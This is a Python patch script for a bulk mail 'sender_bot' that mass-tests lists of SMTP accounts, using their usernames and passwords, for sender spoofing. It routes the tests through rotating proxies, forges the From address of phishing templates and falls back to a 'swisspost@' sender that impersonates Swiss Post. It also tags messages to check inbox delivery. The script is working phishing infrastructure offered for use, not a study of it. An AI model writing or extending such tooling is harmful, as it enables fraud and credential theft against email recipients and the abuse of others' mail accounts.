#!/usr/bin/env python3
"""Patch: Replace quick_spoof_test and send_spoof_to_checker with send_clean in mass test/imap"""

bot_path = '/opt/darkvasend/auditguard/sender_bot.py'
with open(bot_path, 'r') as f:
    bot = f.read()

# === 1. Fix _bg_mass_test: replace quick_spoof_test with send_clean ===
old_test_one = '''    def _test_one(idx: int, s: dict) -> dict:
        """Test a single SMTP — runs in thread pool."""
        # Pick a proxy for this test (round-robin across threads)
        from .proxy_pool import ProxyPool
        _pool = ProxyPool(DB_PATH)
        _proxy = _pool.get_random() if _pool.count_active() > 0 else None
        _pool.close()

        try:
            result = quick_spoof_test(
                s["host"], s["port"], s["user"], s["password"],
                to_email,
                tpl["from_name"], tpl["from_email"],
                tpl["subject"], tpl["html"],
                timeout=8,
                reply_to=tpl.get("reply_to", "") or tpl["from_email"],
                proxy=_proxy,
            )
        except Exception as e:
            result = {"success": False, "mode": "failed", "error": f"{type(e).__name__}", "provider_type": "unknown"}'''

new_test_one = '''    def _test_one(idx: int, s: dict) -> dict:
        """Test a single SMTP with send_clean (TLD strip auto)."""
        from .campaign_sender import send_clean

        smtp_config = {
            "host": s["host"], "port": s["port"],
            "username": s["user"], "password": s["password"],
            "from_email": s["user"],
        }

        # Detect provider type
        h = s["host"].lower()
        prov = h.replace("smtp.", "").replace("mail.", "").split(".")[0]
        for p, kw in [("hostinger","hostinger"),("singnet","singnet"),("brevo","brevo"),
                       ("sendgrid","sendgrid"),("gmail","gmail"),("ovh","ovh")]:
            if kw in h:
                prov = p
                break

        try:
            # Try spoof (send_clean auto-strips TLD)
            result = send_clean(
                smtp_config, tpl["from_name"], tpl["from_email"],
                to_email, tpl["subject"], tpl["html"],
                tpl.get("reply_to", ""), None,
            )
            if result["success"]:
                result["mode"] = "spoof"
            else:
                # Fallback basique: swisspost@domain_of_smtp
                domain = s["user"].split("@")[1] if "@" in s["user"] else s["host"]
                bas_from = "swisspost@" + domain
                result2 = send_clean(
                    smtp_config, tpl["from_name"], bas_from,
                    to_email, tpl["subject"], tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if result2["success"]:
                    result = result2
                    result["mode"] = "strip"
                else:
                    result["mode"] = "failed"
            result["provider_type"] = prov
        except Exception as e:
            result = {"success": False, "mode": "failed", "error": f"{type(e).__name__}", "provider_type": prov}'''

if old_test_one in bot:
    bot = bot.replace(old_test_one, new_test_one)
    print('1. Replaced _test_one with send_clean')
else:
    print('1. WARN: _test_one pattern not found')

# Remove old import of quick_spoof_test in _run_mass_test
bot = bot.replace(
    '    from .campaign_sender import quick_spoof_test\n    from .spoof_templates import get_template',
    '    from .spoof_templates import get_template'
)

# Remove second quick_spoof_test import in _bg_mass_test
bot = bot.replace(
    '    from .campaign_sender import quick_spoof_test\n    from concurrent.futures',
    '    from concurrent.futures'
)
print('2. Cleaned quick_spoof_test imports')

# === 3. Fix _bg_mass_imap_check: replace send_spoof_to_checker with send_clean ===
old_dual = '''    def _test_one_dual(idx: int, s: dict):
        """Send SPOOF + BASIQUE for one SMTP."""
        marker_s = f"SP-{_uuid.uuid4().hex[:8]}"
        try:
            ok_s, mode_s, err_s, marker_s = send_spoof_to_checker(
                s["host"], s["port"], s["user"], s["password"],
                checker_email,
                tpl["from_name"], tpl["from_email"],
                tpl["subject"], tpl["html"],
                marker=marker_s,
                reply_to=tpl.get("reply_to", ""),
                timeout=6,
            )
        except Exception as e:
            ok_s, err_s = False, str(e)[:40]

        marker_b = f"BQ-{_uuid.uuid4().hex[:8]}"
        basique_from = _build_basique_from(s["user"], brand_name)
        try:
            ok_b, err_b = _send_basique_to_checker(
                s["host"], s["port"], s["user"], s["password"],
                checker_email,
                tpl["from_name"], basique_from,
                tpl["subject"], tpl["html"],
                marker_b,
                reply_to=tpl.get("reply_to", ""),
                timeout=6,
            )
        except Exception as e:
            ok_b, err_b = False, str(e)[:40]'''

new_dual = '''    def _test_one_dual(idx: int, s: dict):
        """Send SPOOF + BASIQUE for one SMTP using send_clean."""
        from .campaign_sender import send_clean

        smtp_config = {
            "host": s["host"], "port": s["port"],
            "username": s["user"], "password": s["password"],
            "from_email": s["user"],
        }

        marker_s = f"SP-{_uuid.uuid4().hex[:8]}"
        # SPOOF mode (TLD strip auto in send_clean)
        tracked_subject_s = f"{tpl['subject']} [{marker_s}]"
        try:
            r_s = send_clean(
                smtp_config, tpl["from_name"], tpl["from_email"],
                checker_email, tracked_subject_s, tpl["html"],
                tpl.get("reply_to", ""), None,
            )
            ok_s = r_s["success"]
            err_s = r_s.get("error", "")
        except Exception as e:
            ok_s, err_s = False, str(e)[:40]

        marker_b = f"BQ-{_uuid.uuid4().hex[:8]}"
        basique_from = _build_basique_from(s["user"], brand_name)
        tracked_subject_b = f"{tpl['subject']} [{marker_b}]"
        try:
            r_b = send_clean(
                smtp_config, tpl["from_name"], basique_from,
                checker_email, tracked_subject_b, tpl["html"],
                tpl.get("reply_to", ""), None,
            )
            ok_b = r_b["success"]
            err_b = r_b.get("error", "")
        except Exception as e:
            ok_b, err_b = False, str(e)[:40]'''

if old_dual in bot:
    bot = bot.replace(old_dual, new_dual)
    print('3. Replaced _test_one_dual with send_clean')
else:
    print('3. WARN: _test_one_dual pattern not found')

# Clean old imports
bot = bot.replace(
    '''    from .imap_checker import (
        send_spoof_to_checker, GMAIL_CHECKER,
    )
    from concurrent.futures''',
    '''    from .imap_checker import GMAIL_CHECKER
    from concurrent.futures'''
)
print('4. Cleaned send_spoof_to_checker import')

with open(bot_path, 'w') as f:
    f.write(bot)

# Verify
with open(bot_path, 'r') as f:
    final = f.read()
print(f"\nquick_spoof_test remaining: {final.count('quick_spoof_test')}")
print(f"send_spoof_to_checker remaining: {final.count('send_spoof_to_checker')}")
print(f"send_clean count: {final.count('send_clean')}")
print("DONE")
